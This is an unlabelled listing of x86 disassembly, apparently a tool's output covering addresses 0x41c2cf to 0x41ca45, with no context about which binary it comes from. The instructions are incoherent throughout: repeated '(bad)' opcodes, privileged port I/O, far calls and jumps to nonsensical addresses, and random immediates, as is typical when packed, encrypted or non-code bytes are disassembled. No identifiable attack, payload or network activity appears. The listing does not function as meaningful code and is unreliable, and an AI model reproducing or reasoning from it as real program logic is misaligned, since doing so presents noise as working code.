  41c2cf:	js     0x41c2cd
  41c2d1:	les    esi,FWORD PTR [ebp+esi*8-0x42c39729]
  41c2d8:	mov    eax,eax
  41c2da:	mov    eax,ds:0x5701b30
  41c2df:	jno    0x41c26d
  41c2e1:	outs   dx,BYTE PTR ds:[esi]
  41c2e2:	jl     0x41c2ba
  41c2e4:	aad    0x7
  41c2e6:	xor    DWORD PTR [eax+0x12ff442],eax
  41c2ec:	push   0xc27c35f2
  41c2f1:	stos   BYTE PTR es:[edi],al
  41c2f2:	adc    DWORD PTR [esi+0x19],ebx
  41c2f5:	test   DWORD PTR [esi],ecx
  41c2f7:	and    al,0x8f
  41c2f9:	mov    edi,0xeaad72d9
  41c2fe:	rep outs dx,DWORD PTR ds:[esi]
  41c300:	dec    edx
  41c301:	dec    edx
  41c302:	(bad)  
  41c303:	in     al,0x3f
  41c305:	call   0xbd163139
  41c30a:	ins    BYTE PTR es:[edi],dx
  41c30b:	pop    ebx
  41c30c:	jg     0x41c37c
  41c30e:	sbb    DWORD PTR [edx+ebx*4],0x2e117d9c
  41c315:	retf   0x30c8
  41c318:	inc    ebx
  41c319:	test   bh,ch
  41c31b:	inc    esp
  41c31c:	in     al,0xfa
  41c31e:	fild   QWORD PTR [eax-0x4045c589]
  41c324:	sub    al,0x4f
  41c326:	push   ecx
  41c327:	push   0x76
  41c329:	mov    ah,0x3f
  41c32b:	lods   al,BYTE PTR ds:[esi]
  41c32c:	inc    eax
  41c32d:	pop    eax
  41c32e:	mov    esp,0x52e1bc19
  41c333:	cld    
  41c334:	cs adc al,0x4d
  41c337:	iret   
  41c338:	jg     0x41c385
  41c33a:	stos   BYTE PTR es:[edi],al
  41c33b:	cmp    dl,BYTE PTR [edx-0x73]
  41c33e:	lods   eax,DWORD PTR ds:[esi]
  41c33f:	jl     0x41c31d
  41c341:	fadd   QWORD PTR [esi-0x7b]
  41c344:	xor    al,0xbe
  41c346:	or     eax,0x288902b7
  41c34b:	jge    0x41c2f8
  41c34d:	xchg   esp,eax
  41c34e:	mov    ds,WORD PTR [ebx-0x33]
  41c351:	jae    0x41c30a
  41c353:	aaa    
  41c354:	push   0xb3b8a9ff
  41c359:	mov    esi,0x2cb35750
  41c35e:	test   DWORD PTR [edx+0x3d4d011f],ecx
  41c364:	mov    cl,0xff
  41c366:	mov    fs,edi
  41c368:	xlat   BYTE PTR ds:[ebx]
  41c369:	popa   
  41c36a:	pop    es
  41c36b:	enter  0x8405,0xde
  41c36f:	test   DWORD PTR ds:0x50e7620a,0x49e243b3
  41c379:	pop    esi
  41c37a:	push   edx
  41c37b:	pop    esi
  41c37c:	cmp    ebp,esp
  41c37e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c37f:	jo     0x41c367
  41c381:	mov    edx,0xa43a9653
  41c386:	jg     0x41c3ac
  41c388:	mov    ah,0xca
  41c38a:	and    al,0x61
  41c38c:	adc    esp,DWORD PTR [ecx]
  41c38e:	cmp    ah,bh
  41c390:	sbb    BYTE PTR [ebp+0x39e2d4e4],bh
  41c396:	jae    0x41c3e8
  41c398:	mov    ecx,0xf8b171af
  41c39e:	mov    dl,0xb
  41c3a0:	fs push esp
  41c3a2:	xor    BYTE PTR [ecx+0x5efbcd9a],bl
  41c3a8:	add    DWORD PTR [edx],esp
  41c3aa:	push   esi
  41c3ab:	adc    eax,0xcbf0bf88
  41c3b0:	sar    esp,cl
  41c3b2:	lods   al,BYTE PTR ds:[esi]
  41c3b3:	arpl   WORD PTR [ecx+0x136f6dad],sp
  41c3b9:	stos   DWORD PTR es:[edi],eax
  41c3ba:	rcl    DWORD PTR [ecx-0xa62030f],0xec
  41c3c1:	call   0x55ae31f6
  41c3c6:	lods   eax,DWORD PTR ds:[esi]
  41c3c7:	enter  0x3a4d,0x36
  41c3cb:	push   eax
  41c3cc:	sub    BYTE PTR [esi-0x2b],dl
  41c3cf:	je     0x41c401
  41c3d1:	or     bh,dh
  41c3d3:	out    dx,eax
  41c3d4:	add    al,0x50
  41c3d6:	jmp    0xbf3d9843
  41c3db:	fild   DWORD PTR [ebx+0x6a]
  41c3de:	stos   DWORD PTR es:[edi],eax
  41c3df:	or     DWORD PTR [edx],esi
  41c3e1:	xor    eax,esp
  41c3e3:	jnp    0x41c39c
  41c3e5:	(bad)  
  41c3e6:	cmc    
  41c3e7:	lods   al,BYTE PTR ds:[esi]
  41c3e8:	push   edi
  41c3e9:	nop
  41c3ea:	xchg   BYTE PTR [ebx],bl
  41c3ec:	mov    ah,0xde
  41c3ee:	sbb    al,0xf9
  41c3f0:	inc    ecx
  41c3f1:	jmp    0xadcae9fc
  41c3f6:	sti    
  41c3f7:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  41c3f9:	cmp    DWORD PTR [ecx+0x1f],0x454bf33f
  41c400:	add    al,0xb3
  41c402:	push   ss
  41c403:	jle    0x41c419
  41c405:	fs jle 0x41c3e8
  41c408:	fwait
  41c409:	xor    BYTE PTR [edi+0x18199e7d],dl
  41c40f:	imul   esi,DWORD PTR [edx+ecx*2+0x14],0xb5e12400
  41c417:	jne    0x41c3c8
  41c419:	mov    ecx,0x54e0bbbf
  41c41e:	inc    eax
  41c41f:	out    dx,al
  41c420:	dec    ebp
  41c421:	ss jo  0x41c3e0
  41c424:	mov    BYTE PTR [edx+ebp*8],ch
  41c427:	or     eax,0x33511b6c
  41c42c:	jne    0x41c477
  41c42e:	add    esi,esp
  41c430:	lods   al,BYTE PTR ds:[esi]
  41c431:	mov    bl,0xc3
  41c433:	popa   
  41c434:	pop    ebx
  41c435:	popf   
  41c436:	retf   0xb12a
  41c439:	push   es
  41c43a:	loopne 0x41c40f
  41c43c:	xchg   esi,eax
  41c43d:	lods   al,BYTE PTR ds:[esi]
  41c43e:	dec    eax
  41c43f:	fild   WORD PTR ds:0xe0cfd928
  41c445:	mov    ebp,0x3f26457e
  41c44a:	sbb    BYTE PTR [esi],al
  41c44c:	shl    DWORD PTR [edi-0x17],0x8e
  41c450:	cmp    ebp,edi
  41c452:	std    
  41c453:	test   DWORD PTR [ebx],eax
  41c455:	mov    esp,0x5f0b5d98
  41c45a:	jnp    0x41c46a
  41c45c:	movzx  edi,WORD PTR [ebx]
  41c45f:	jge    0x41c43c
  41c461:	in     eax,0x5f
  41c463:	mov    ecx,esi
  41c465:	fs div ah
  41c468:	mov    al,ds:0x828ecfe
  41c46d:	ret    
  41c46e:	outs   dx,BYTE PTR ds:[esi]
  41c46f:	(bad)  
  41c470:	call   0xf5c1:0xa176a6c9
  41c477:	push   ss
  41c478:	scas   al,BYTE PTR es:[edi]
  41c479:	ret    
  41c47a:	test   DWORD PTR [edx+ebp*1+0x24148a10],edx
  41c481:	mov    ebx,0x596680a6
  41c486:	inc    eax
  41c487:	bound  ebx,QWORD PTR [ecx+0x1d]
  41c48a:	push   ds
  41c48b:	sahf   
  41c48c:	jp     0x41c50c
  41c48e:	sub    ecx,DWORD PTR [edx-0x2c012085]
  41c494:	sub    eax,0x6e37db8f
  41c499:	pop    ss
  41c49a:	mov    DWORD PTR [ebx],edx
  41c49c:	dec    ebx
  41c49d:	or     edx,edi
  41c49f:	jl     0x41c43e
  41c4a1:	cmovg  eax,DWORD PTR fs:[esp+eiz*4+0x11ef37e5]
  41c4aa:	out    0xd,eax
  41c4ac:	ss push ebx
  41c4ae:	xor    BYTE PTR [ebp-0x2e],bh
  41c4b1:	mov    ebx,0xbbe28d85
  41c4b6:	stc    
  41c4b7:	cwde   
  41c4b8:	int    0xf4
  41c4ba:	xchg   DWORD PTR [edx-0x4d],eax
  41c4bd:	icebp  
  41c4be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c4bf:	adc    esi,DWORD PTR [edx]
  41c4c1:	ficomp DWORD PTR [eax-0x1b]
  41c4c4:	xchg   esi,eax
  41c4c5:	dec    ecx
  41c4c6:	and    al,0x6e
  41c4c8:	add    BYTE PTR [ecx+0x10a58cd5],bh
  41c4ce:	sub    al,0xd
  41c4d0:	mov    esi,0xded71338
  41c4d5:	iret   
  41c4d6:	push   esp
  41c4d7:	inc    ebp
  41c4d8:	add    ch,BYTE PTR [ebp-0x6a]
  41c4db:	xor    DWORD PTR [ebx+edi*4-0x7242f8e7],0x479f80d4
  41c4e6:	retf   
  41c4e7:	(bad)  
  41c4e8:	push   edi
  41c4e9:	mov    dl,0xf0
  41c4eb:	gs call 0x9c4c48c3
  41c4f1:	int3   
  41c4f2:	dec    edi
  41c4f3:	mov    ds:0xb2e42b82,eax
  41c4f8:	(bad)  
  41c4f9:	fnstsw WORD PTR [edi+0x31]
  41c4fc:	scas   eax,DWORD PTR es:[edi]
  41c4fd:	xchg   edx,eax
  41c4fe:	xchg   edx,eax
  41c4ff:	inc    edi
  41c500:	lds    esp,FWORD PTR [ebx*4+0xb6fa3d9]
  41c507:	imul   edx,DWORD PTR [ebp+eiz*1-0x23b26806],0xffffffb5
  41c50f:	js     0x41c515
  41c511:	ja     0x41c516
  41c513:	adc    ebp,ecx
  41c515:	mov    cl,BYTE PTR [ebx+ecx*2]
  41c518:	add    dl,BYTE PTR [esi+0x6e]
  41c51b:	push   0xffffffc4
  41c51d:	dec    eax
  41c51e:	push   0x336f82fe
  41c523:	mov    esi,0x6cc0d48e
  41c528:	cmp    DWORD PTR ds:0x5a21593e,ebp
  41c52e:	xchg   bl,dh
  41c530:	int    0x79
  41c532:	dec    esi
  41c533:	cmp    eax,0x2670092c
  41c538:	sub    cl,BYTE PTR [ecx+eiz*1+0x2f]
  41c53c:	repnz inc DWORD PTR es:[ebp+0x3765cec6]
  41c544:	xor    edx,DWORD PTR [esi-0x52b2434b]
  41c54a:	jne    0x41c5a8
  41c54c:	sub    DWORD PTR [ecx-0x25dcfb4a],edi
  41c552:	cwde   
  41c553:	aam    0x84
  41c555:	out    0xab,eax
  41c557:	iret   
  41c558:	pop    esi
  41c559:	sbb    al,0xc8
  41c55b:	xchg   ebx,eax
  41c55c:	mov    dl,0x89
  41c55e:	cmp    BYTE PTR [edx],al
  41c560:	mov    ebp,0xd17ec9b0
  41c565:	rcr    BYTE PTR [edi],0x6
  41c568:	sbb    DWORD PTR [esp+eiz*8-0x7d],ebp
  41c56c:	out    0xd6,eax
  41c56e:	dec    eax
  41c56f:	xchg   esi,eax
  41c570:	sbb    DWORD PTR [ebp+0x20687dfb],ebp
  41c576:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c577:	ins    BYTE PTR es:[edi],dx
  41c578:	call   0x3b20:0x4c927ea0
  41c57f:	jno    0x41c522
  41c581:	xchg   BYTE PTR [esi-0x5a],cl
  41c584:	cmp    eax,0xdc07a326
  41c589:	mov    fs,WORD PTR [edi]
  41c58b:	(bad)  
  41c58c:	mov    edx,0x86ec4046
  41c591:	pop    ds
  41c592:	stos   DWORD PTR es:[edi],eax
  41c593:	push   0x3f
  41c595:	mov    ebp,0x5f664194
  41c59a:	imul   ebp,DWORD PTR [ebx-0x77],0x50
  41c59e:	jb     0x41c5fd
  41c5a0:	mov    ebx,0x984d466f
  41c5a5:	es mov bh,0xf9
  41c5a8:	aam    0x67
  41c5aa:	mov    ebx,0x67fbd333
  41c5af:	arpl   si,si
  41c5b1:	xchg   edx,eax
  41c5b2:	mov    ebx,esp
  41c5b4:	mov    ebx,0x17d80b9e
  41c5b9:	inc    edx
  41c5ba:	pop    esi
  41c5bb:	test   al,0x29
  41c5bd:	call   0xd1219d06
  41c5c2:	xor    al,0xa6
  41c5c4:	dec    ecx
  41c5c5:	ror    ecx,cl
  41c5c7:	xchg   BYTE PTR [ecx+ebp*8+0x3c],bl
  41c5cb:	push   ebx
  41c5cc:	ss and al,0xb5
  41c5cf:	pop    ebx
  41c5d0:	and    DWORD PTR [ebp-0x1199d31f],eax
  41c5d6:	repz fmul QWORD PTR [esi-0x71]
  41c5da:	push   ecx
  41c5db:	mov    esp,0x9ecc14df
  41c5e0:	pop    eax
  41c5e1:	mov    ecx,0x5694a65b
  41c5e6:	bound  ebp,QWORD PTR [ebx+0x5c7e8e01]
  41c5ec:	dec    edx
  41c5ed:	es ja  0x41c64d
  41c5f0:	retf   
  41c5f1:	je     0x41c5eb
  41c5f3:	cs pop eax
  41c5f5:	jecxz  0x41c63c
  41c5f7:	xor    ah,BYTE PTR [ebp+0x68]
  41c5fa:	lods   al,BYTE PTR ds:[esi]
  41c5fb:	xor    ah,BYTE PTR [eax]
  41c5fd:	mov    ch,0xb4
  41c5ff:	inc    ecx
  41c600:	dec    ebx
  41c601:	mov    esi,DWORD PTR [edx+ecx*8-0x2881e9b7]
  41c608:	xchg   esp,eax
  41c609:	outs   dx,BYTE PTR ds:[esi]
  41c60a:	ss scas eax,DWORD PTR es:[edi]
  41c60c:	aam    0x55
  41c60e:	ret    0x2a69
  41c611:	and    DWORD PTR fs:[ebp+0x38],eax
  41c615:	in     eax,dx
  41c616:	outs   dx,BYTE PTR ds:[esi]
  41c617:	fwait
  41c618:	imul   ecx,DWORD PTR [esi],0xffffff96
  41c61b:	mov    dl,0xf6
  41c61d:	pushf  
  41c61e:	add    bl,BYTE PTR [edi+0x34]
  41c621:	(bad)  
  41c622:	dec    edx
  41c623:	into   
  41c624:	sub    eax,0x77177605
  41c629:	mov    ecx,0x37564914
  41c62e:	inc    ecx
  41c62f:	imul   esp,DWORD PTR [ebx+eiz*2-0x2a],0xb8da5e48
  41c637:	mov    eax,0x9b11e749
  41c63c:	fist   DWORD PTR [ecx+0x12]
  41c63f:	cmp    DWORD PTR [edi+0x2ccc93bb],edi
  41c645:	mov    eax,0x4ea13041
  41c64a:	ret    
  41c64b:	sbb    DWORD PTR [edx+0x633188eb],ecx
  41c651:	inc    ebx
  41c652:	inc    edx
  41c653:	dec    ecx
  41c654:	(bad)
  41c657:	jno    0x41c656
  41c659:	mov    dl,BYTE PTR [ebx+0x27]
  41c65c:	retf   
  41c65d:	jmp    0xf34a:0x3aa1d06f
  41c664:	ins    DWORD PTR es:[edi],dx
  41c665:	lds    edi,FWORD PTR [eax+edi*1]
  41c668:	add    ah,0x41
  41c66b:	arpl   bx,cx
  41c66d:	mov    ds:0x21cf809e,al
  41c672:	pop    esp
  41c673:	xchg   ch,dl
  41c675:	into   
  41c676:	push   es
  41c677:	in     eax,0xe7
  41c679:	in     al,dx
  41c67a:	sub    ah,BYTE PTR [ebx]
  41c67c:	push   esp
  41c67d:	xor    eax,0x119fbd9e
  41c682:	xor    ecx,esi
  41c684:	fdivr  st,st(6)
  41c686:	int3   
  41c687:	inc    ebx
  41c688:	(bad)  
  41c689:	ret    0xfd81
  41c68c:	mov    edx,0x931c81f8
  41c691:	sbb    cl,BYTE PTR [eax-0x42fc2f8f]
  41c697:	mov    al,ds:0x6aa5f809
  41c69c:	ds cs xchg esp,eax
  41c69f:	jns    0x41c6ca
  41c6a1:	push   ds
  41c6a2:	fwait
  41c6a3:	out    dx,al
  41c6a4:	imul   BYTE PTR [ebp-0x7db77828]
  41c6aa:	adc    eax,0x90a77e72
  41c6af:	int3   
  41c6b0:	mov    ebp,0xd75234a6
  41c6b5:	jmp    0x4b97:0xc6cc057a
  41c6bc:	or     DWORD PTR [esi-0x76],0x87a1fb2
  41c6c3:	jno    0x41c6bf
  41c6c5:	mov    eax,ds:0xcfa0fb19
  41c6ca:	lds    esp,FWORD PTR [ecx+0x12]
  41c6cd:	push   cs
  41c6ce:	stc    
  41c6cf:	inc    esp
  41c6d0:	sbb    ch,BYTE PTR ds:0xbf236e16
  41c6d6:	inc    ebx
  41c6d7:	push   edx
  41c6d8:	icebp  
  41c6d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c6da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c6db:	pop    eax
  41c6dc:	adc    BYTE PTR [edx+esi*4+0x10],dh
  41c6e0:	cmp    edi,DWORD PTR [eax]
  41c6e2:	jb     0x41c75c
  41c6e4:	sar    BYTE PTR [ecx-0x35],1
  41c6e7:	pushf  
  41c6e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c6e9:	cmp    bl,BYTE PTR [edi]
  41c6eb:	or     DWORD PTR [esp+edx*8-0x1b],0x295d9e33
  41c6f3:	pop    ebp
  41c6f4:	cmp    DWORD PTR [ebx+0x3dc638dd],edi
  41c6fa:	pop    esi
  41c6fb:	arpl   WORD PTR [esi-0x26bcbff8],cx
  41c701:	push   ebp
  41c702:	cdq    
  41c703:	hlt    
  41c704:	fs xchg esi,eax
  41c706:	cmp    al,0x81
  41c708:	cmp    cl,BYTE PTR [edi+0x2]
  41c70b:	dec    ecx
  41c70c:	mov    ebp,0x19d0903d
  41c711:	push   esi
  41c712:	in     al,0x82
  41c714:	or     edx,ecx
  41c716:	and    BYTE PTR [esi+ecx*8-0x70],0x54
  41c71b:	fnstsw WORD PTR [ebp+0x55c3d1]
  41c721:	mov    ah,0xec
  41c723:	into   
  41c724:	daa    
  41c725:	lods   eax,DWORD PTR ds:[esi]
  41c726:	jge    0x41c6b3
  41c728:	pop    ebx
  41c729:	(bad)  
  41c72a:	bnd jle 0x41c729
  41c72d:	pop    eax
  41c72e:	cmp    DWORD PTR [eax],ecx
  41c730:	add    BYTE PTR [edi-0x4e],cl
  41c733:	mov    ebx,0x1f6adc15
  41c738:	pop    edx
  41c739:	sub    al,0x48
  41c73b:	mov    al,0xa2
  41c73d:	in     eax,0x4b
  41c73f:	popf   
  41c740:	nop
  41c741:	jo     0x41c6c5
  41c743:	lds    ecx,FWORD PTR [esi]
  41c745:	mov    al,0x1
  41c747:	sub    ch,BYTE PTR [esp+eiz*8-0x75]
  41c74b:	add    esp,eax
  41c74d:	and    edi,DWORD PTR [esi]
  41c74f:	inc    esp
  41c750:	mov    BYTE PTR [ebp+0x54],0x28
  41c754:	mov    gs,WORD PTR [edi-0x19]
  41c757:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c758:	iret   
  41c759:	or     al,ah
  41c75b:	or     BYTE PTR cs:[edx+0x3c],bl
  41c75f:	(bad)  
  41c760:	push   edi
  41c761:	xchg   ecx,eax
  41c762:	(bad)  
  41c764:	mov    eax,0xcc74b873
  41c769:	sar    DWORD PTR [ecx+ebx*2],cl
  41c76c:	push   esi
  41c76d:	and    dl,BYTE PTR [eax]
  41c76f:	aam    0xe9
  41c771:	ja     0x41c7ed
  41c773:	xchg   esi,eax
  41c774:	outs   dx,BYTE PTR ds:[esi]
  41c775:	js     0x41c77f
  41c777:	enter  0x6686,0xe3
  41c77b:	and    edi,0x7af8f240
  41c781:	cwde   
  41c782:	xchg   ecx,eax
  41c783:	sub    dl,ah
  41c785:	rol    BYTE PTR [ecx+0x2ddb674a],0xae
  41c78c:	push   ebp
  41c78d:	stc    
  41c78e:	inc    ecx
  41c78f:	lods   eax,DWORD PTR ds:[esi]
  41c790:	fadd   st,st(5)
  41c792:	fbstp  TBYTE PTR [edx]
  41c794:	jecxz  0x41c75b
  41c796:	pop    ecx
  41c797:	sbb    eax,0x2dfef76e
  41c79c:	dec    al
  41c79e:	ins    DWORD PTR es:[edi],dx
  41c79f:	adc    DWORD PTR [ebx+0x7b],esp
  41c7a2:	(bad)  
  41c7a3:	jne    0x41c7e9
  41c7a5:	xchg   cl,ah
  41c7a7:	xor    BYTE PTR [esi+0x3c],bh
  41c7aa:	outs   dx,BYTE PTR ds:[esi]
  41c7ab:	neg    DWORD PTR [ecx+0x51]
  41c7ae:	inc    edi
  41c7af:	add    eax,0xaf5bfd5f
  41c7b4:	mov    esp,0x65f38b4d
  41c7b9:	xchg   esi,eax
  41c7ba:	int    0xed
  41c7bc:	shl    DWORD PTR [edx+ecx*4],1
  41c7bf:	xchg   DWORD PTR [eax-0x58],ecx
  41c7c2:	into   
  41c7c3:	dec    ecx
  41c7c4:	sahf   
  41c7c5:	sbb    edx,DWORD PTR [ecx]
  41c7c7:	popf   
  41c7c8:	aam    0x65
  41c7ca:	sbb    edx,ebp
  41c7cc:	fidiv  DWORD PTR [esi+0x38]
  41c7cf:	adc    edx,esi
  41c7d1:	or     cl,BYTE PTR [eax+0x431a2a59]
  41c7d7:	push   ds
  41c7d8:	leave  
  41c7d9:	loopne 0x41c7d6
  41c7db:	dec    esp
  41c7dc:	or     eax,0x7c4944a9
  41c7e1:	loope  0x41c7a3
  41c7e3:	pop    esp
  41c7e4:	cmp    eax,0x3291c941
  41c7e9:	enter  0x8016,0x7d
  41c7ed:	test   eax,0x84f511d
  41c7f2:	adc    ebp,ecx
  41c7f4:	mov    ch,0x6d
  41c7f6:	out    0xd1,eax
  41c7f8:	call   DWORD PTR [eax+esi*8]
  41c7fb:	or     eax,0x42dfe8b3
  41c800:	jmp    DWORD PTR [ebx]
  41c802:	cli    
  41c803:	mov    esp,0xd496db85
  41c808:	and    esp,esi
  41c80a:	js     0x41c819
  41c80c:	enter  0x38f9,0xc
  41c810:	cmc    
  41c811:	cld    
  41c812:	add    BYTE PTR [ebp-0x26bce5f2],dh
  41c818:	sti    
  41c819:	dec    eax
  41c81a:	scas   al,BYTE PTR es:[edi]
  41c81b:	adc    ebp,DWORD PTR [ecx+0x4c4579e4]
  41c821:	pop    ds
  41c822:	xchg   edx,eax
  41c823:	add    al,0xed
  41c825:	repz dec edx
  41c827:	xor    edi,DWORD PTR [esi]
  41c829:	shr    cl,cl
  41c82b:	pop    edx
  41c82c:	daa    
  41c82d:	sub    ah,dh
  41c82f:	mov    ds:0xd2fdf8a0,al
  41c834:	std    
  41c835:	sbb    bh,bl
  41c837:	sar    BYTE PTR ds:0x1777f405,cl
  41c83d:	inc    ebx
  41c83e:	sub    al,0x9e
  41c840:	inc    eax
  41c841:	mov    BYTE PTR [esi+edx*4-0x36],ch
  41c845:	pushf  
  41c846:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c847:	test   al,0x3b
  41c849:	fadd   DWORD PTR [ebp-0x5e]
  41c84c:	xor    BYTE PTR [edi-0x137b92bc],al
  41c852:	sbb    bh,BYTE PTR [ebx+0x59]
  41c855:	jmp    0x1b974269
  41c85a:	xlat   BYTE PTR ds:[ebx]
  41c85b:	(bad)
  41c85e:	stc    
  41c85f:	push   eax
  41c860:	or     DWORD PTR [ebx+0x50],ecx
  41c863:	jbe    0x41c86c
  41c865:	mov    ebx,DWORD PTR [ebx+0x3561747c]
  41c86b:	push   esp
  41c86c:	sub    al,0x4e
  41c86e:	adc    eax,0xa4dfd88c
  41c873:	pop    ecx
  41c874:	cld    
  41c875:	adc    eax,0x491828b7
  41c87a:	sbb    al,0x15
  41c87c:	push   ebp
  41c87d:	test   bl,al
  41c87f:	sub    dh,ah
  41c881:	aam    0xe4
  41c883:	add    esi,eax
  41c885:	push   es
  41c886:	inc    eax
  41c887:	pop    ebx
  41c888:	pop    ds
  41c889:	mov    eax,0xca6f28c1
  41c88e:	dec    ebx
  41c88f:	sub    eax,0x1f0215cb
  41c894:	shl    BYTE PTR [ebx+0x275de01f],cl
  41c89a:	sahf   
  41c89b:	pop    ebx
  41c89c:	stc    
  41c89d:	add    eax,0x752c65aa
  41c8a2:	rcl    ebp,1
  41c8a4:	fisttp DWORD PTR [ebx+0x21]
  41c8a7:	outs   dx,BYTE PTR ds:[esi]
  41c8a8:	pop    es
  41c8a9:	int3   
  41c8aa:	loopne 0x41c907
  41c8ac:	add    DWORD PTR [ebp-0x368f26da],0x27
  41c8b3:	pop    esi
  41c8b4:	in     al,0x81
  41c8b6:	les    ebp,FWORD PTR [esi+esi*2]
  41c8b9:	add    al,0xaa
  41c8bb:	sbb    DWORD PTR [ebp+0x50],eax
  41c8be:	or     al,0xb2
  41c8c0:	cdq    
  41c8c1:	pop    esp
  41c8c2:	push   cs
  41c8c3:	(bad)  [ebx-0x72]
  41c8c6:	push   edi
  41c8c7:	push   es
  41c8c8:	add    ecx,DWORD PTR [eax]
  41c8ca:	push   esi
  41c8cb:	je     0x41c940
  41c8cd:	shr    BYTE PTR [ecx],cl
  41c8cf:	ins    BYTE PTR es:[edi],dx
  41c8d0:	xchg   esp,eax
  41c8d1:	mov    edi,0x982e5575
  41c8d6:	pop    edx
  41c8d7:	ret    0xf051
  41c8da:	lds    esp,FWORD PTR [esi-0x29]
  41c8dd:	xor    BYTE PTR [esi],ah
  41c8df:	sbb    edx,0xffffffb9
  41c8e2:	lods   al,BYTE PTR ds:[esi]
  41c8e3:	jge    0x41c8ed
  41c8e5:	mov    dh,0x43
  41c8e7:	pop    ds
  41c8e8:	aad    0xb7
  41c8ea:	xchg   edx,eax
  41c8eb:	jb     0x41c94d
  41c8ed:	lds    ecx,FWORD PTR [ebx+0x14a7fc93]
  41c8f3:	ret    0x56fb
  41c8f6:	fs addr16 xor eax,0x34fbf859
  41c8fd:	pop    es
  41c8fe:	adc    bl,BYTE PTR [ecx-0x5336bf3b]
  41c904:	ror    DWORD PTR [ebx-0x31a201a7],0x61
  41c90b:	gs jg  0x41c8d1
  41c90e:	mov    esp,0x688cc925
  41c913:	jg     0x41c89f
  41c915:	ficom  WORD PTR [eax]
  41c917:	retf   0xdf56
  41c91a:	lds    edx,FWORD PTR [edx]
  41c91c:	icebp  
  41c91d:	adc    bh,al
  41c91f:	sub    ebx,DWORD PTR [eax+0x5]
  41c922:	mov    ecx,0x59e189c1
  41c927:	push   ecx
  41c928:	adc    esi,DWORD PTR ds:0x909845c
  41c92e:	mov    esp,0xf11f5ed
  41c933:	push   ecx
  41c934:	fs rcr esi,1
  41c937:	pop    ebx
  41c938:	inc    ebx
  41c939:	cmp    bh,BYTE PTR [edi]
  41c93b:	xor    edi,esp
  41c93d:	pop    eax
  41c93e:	mov    ebx,0xc9adb15e
  41c943:	mov    ecx,0x65d810dd
  41c948:	pusha  
  41c949:	xchg   BYTE PTR [esi],ch
  41c94b:	sahf   
  41c94c:	adc    edx,DWORD PTR [ebx+0x49b2ea43]
  41c952:	es leave 
  41c954:	pop    ds
  41c955:	jb     0x41c9cb
  41c957:	jge    0x41c93f
  41c959:	jo     0x41c984
  41c95b:	cmp    BYTE PTR [eax-0x2e],dh
  41c95e:	out    0x17,eax
  41c960:	jl     0x41c969
  41c962:	jns    0x41c97a
  41c964:	sbb    BYTE PTR [ebx+0x26],dh
  41c967:	mov    ebp,0xb317cf1b
  41c96c:	or     DWORD PTR [edi],ebp
  41c96e:	mov    edi,0xb1be8aad
  41c973:	gs mov ch,0x55
  41c976:	cmp    BYTE PTR [eax-0x31c6e91a],0x8e
  41c97d:	xor    edi,eax
  41c97f:	mov    al,ds:0x34c56b32
  41c984:	pop    ebx
  41c985:	jge    0x41c9dc
  41c987:	add    cl,BYTE PTR [ecx+0x5e]
  41c98a:	mov    ecx,edx
  41c98c:	xchg   DWORD PTR [ecx+0xadee50],eax
  41c992:	mov    bl,0x2
  41c994:	ror    BYTE PTR [edx-0x55f48f7],cl
  41c99a:	int3   
  41c99b:	dec    edi
  41c99c:	push   ecx
  41c99d:	cmc    
  41c99e:	ja     0x41c9c3
  41c9a0:	push   ss
  41c9a1:	mov    bh,0xab
  41c9a3:	inc    edi
  41c9a4:	cmp    al,0xc0
  41c9a6:	cmp    esi,ebx
  41c9a8:	xor    eax,0xf391f350
  41c9ad:	add    DWORD PTR [edi+0xca3ce4e],edx
  41c9b3:	adc    dl,dl
  41c9b5:	(bad)  
  41c9b6:	jns    0x41c9d1
  41c9b8:	add    esp,ebp
  41c9ba:	mov    WORD PTR ds:0xb582,fs
  41c9bf:	pop    ss
  41c9c0:	jae    0x41c973
  41c9c2:	jno    0x41c9e5
  41c9c4:	mov    fs,WORD PTR [edx+0x2d]
  41c9c7:	jle    0x41c9eb
  41c9c9:	aad    0x66
  41c9cb:	shl    BYTE PTR [edi+0x1ffce663],cl
  41c9d1:	xchg   BYTE PTR [esi],bl
  41c9d3:	jl     0x41ca51
  41c9d5:	sub    ecx,DWORD PTR [ebx+eax*4-0x783e48d]
  41c9dc:	jmp    0x47a8ca92
  41c9e1:	push   ebp
  41c9e2:	cs dec ebx
  41c9e4:	adc    al,0xec
  41c9e6:	fadd   DWORD PTR [eax+0x25]
  41c9e9:	loop   0x41ca35
  41c9eb:	and    edi,eax
  41c9ed:	pop    ds
  41c9ee:	and    ebp,ebp
  41c9f0:	ret    
  41c9f1:	sti    
  41c9f2:	out    dx,eax
  41c9f3:	sti    
  41c9f4:	mov    ss,WORD PTR [ecx+0x3f]
  41c9f7:	sbb    BYTE PTR [ebx+0x54],0x4c
  41c9fb:	xchg   edi,eax
  41c9fc:	call   0x7e97:0xb187839a
  41ca03:	mov    ebp,0xd915d74f
  41ca08:	imul   edx,DWORD PTR [ecx],0x4e
  41ca0b:	pop    edx
  41ca0c:	jb     0x41ca16
  41ca0e:	push   ds
  41ca0f:	xchg   esi,eax
  41ca10:	gs neg ebp
  41ca13:	pop    ds
  41ca14:	ss jmp 0x767b1efc
  41ca1a:	xchg   ebp,eax
  41ca1b:	jne    0x41c9a8
  41ca1d:	sub    DWORD PTR [edi+0x27],0xffffffae
  41ca21:	or     DWORD PTR [esi],ebx
  41ca23:	inc    esp
  41ca24:	cmp    BYTE PTR [edx+0x38],bl
  41ca27:	retf   0x4c65
  41ca2a:	and    eax,0xdbf0d44f
  41ca2f:	cld    
  41ca30:	aaa    
  41ca31:	jge    0x41ca8f
  41ca33:	jae    0x41c9ca
  41ca35:	jno    0x41ca12
  41ca37:	inc    edi
  41ca38:	sub    edx,ecx
  41ca3a:	retf   
  41ca3b:	inc    esi
  41ca3c:	inc    ebp
  41ca3d:	inc    esi
  41ca3e:	jecxz  0x41ca45
  41ca40:	sub    edx,DWORD PTR [ecx-0xa]
  41ca43:	lds    ebp,FWORD PTR [ecx]
  41ca45:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
